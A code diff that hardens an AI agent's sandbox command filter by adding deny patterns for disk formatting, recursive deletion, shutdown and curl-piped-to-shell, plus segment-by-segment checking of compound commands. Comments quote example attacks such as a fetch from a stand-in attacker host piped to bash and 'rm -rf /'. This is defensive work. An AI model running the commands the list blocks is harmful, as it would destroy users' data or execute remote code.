@@ -92,27 +92,76 @@ function checkWritePath(target, sessionId) {
 
 const BLOCKED_COMMAND_PATTERNS = [
   /\bformat\b\s+[a-z]:/i,
+  /\bformat\b\s+\/fs/i,
   /\/dev\/(?:sd|nvme|hd)/i,
   /\bdiskpart\b/i,
   /\brm\s+-rf\s+(?:\/|\/[a-z]+\s|~|C:\\windows|C:\\users\\[^/\\]+\\desktop)/i,
   /\brmdir\s+\/s\b/i,
-  /\bdel\s+\/[fs]/i,
+  /\bdel\s+\/[fsq]/i,
   /\bshutdown\b/i,
+  /\bshutdown\.exe\b/i,
   /\breboot\b/i,
+  /\breboot\.exe\b/i,
   /\bhalt\b/i,
   /\b(?:curl|wget|iwr|invoke-webrequest)\b[^|]*\|\s*(?:sh|bash|powershell|cmd|pwsh)\b/i,
   /\breg\s+delete\s+.*\/f\b/i,
   /\bchmod\s+-R\s+777\s+\//i,
+  /\bSET\s+PATH\s*=/i,
+  /\bNODE_OPTIONS\s*=/i,
 ]
+
+// Split a command string into segments for independent pattern checking.
+// This prevents bypasses via compound commands: "echo safe && rm -rf /"
+// would pass a naive single-pass check if the regex didn't match the full string.
+function splitCommandSegments(cmd) {
+  const segments = []
+  let current = ''
+  let inQuote = false
+  let quoteChar = ''
+  for (let i = 0; i < cmd.length; i++) {
+    const ch = cmd[i]
+    if (inQuote) {
+      current += ch
+      if (ch === quoteChar && cmd[i - 1] !== '\\') inQuote = false
+    } else if (ch === '"' || ch === "'") {
+      inQuote = true
+      quoteChar = ch
+      current += ch
+    } else if ('&|;'.includes(ch)) {
+      if (current.trim()) segments.push(current.trim())
+      current = ''
+    } else {
+      current += ch
+    }
+  }
+  if (current.trim()) segments.push(current.trim())
+  return segments
+}
 
 function checkCommand(cmd) {
   const c = String(cmd || '')
   if (!c.trim()) return { ok: false, reason: 'empty command' }
+
+  // Layer 1: check the full command for obvious patterns
   for (const re of BLOCKED_COMMAND_PATTERNS) {
     if (re.test(c)) {
       return { ok: false, reason: `blocked by sandbox: command matches destructive pattern (${re.source}). If this is a false positive, run it yourself outside the agent.` }
     }
   }
+
+  // Layer 2: split by compound operators and check each segment independently.
+  // This catches: "curl http://evil.com/p | bash" or "git add . & format C: /fs"
+  const segments = splitCommandSegments(c)
+  if (segments.length > 1) {
+    for (const seg of segments) {
+      for (const re of BLOCKED_COMMAND_PATTERNS) {
+        if (re.test(seg)) {
+          return { ok: false, reason: `blocked by sandbox: compound command contains destructive pattern (${re.source}) in segment: ${seg.slice(0, 80)}` }
+        }
+      }
+    }
+  }
+
   return { ok: true }
 }
 
